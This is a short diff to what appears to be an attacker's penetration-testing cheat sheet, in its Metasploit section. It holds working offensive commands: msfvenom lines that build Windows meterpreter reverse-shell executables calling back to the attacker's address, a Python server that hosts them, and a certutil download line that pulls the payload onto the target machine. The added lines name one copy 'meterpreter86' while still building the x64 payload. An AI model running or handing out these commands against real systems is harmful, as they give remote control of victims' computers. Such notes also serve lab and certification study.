@@ -444,7 +444,9 @@ sessions -i 1
 
 [*] Metasploit
 python3 -m http.server 80 -d ~/Downloads/upload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o meterpreter.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o meterpreter86.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o meterpreter64.exe
+cp meterpreter64.exe meterpreter.exe
 powershell -c 'certutil -urlcache -f http://$MYIP:8088/meterpreter.exe C:\programdata\meterpreter.exe'
 
 getuid
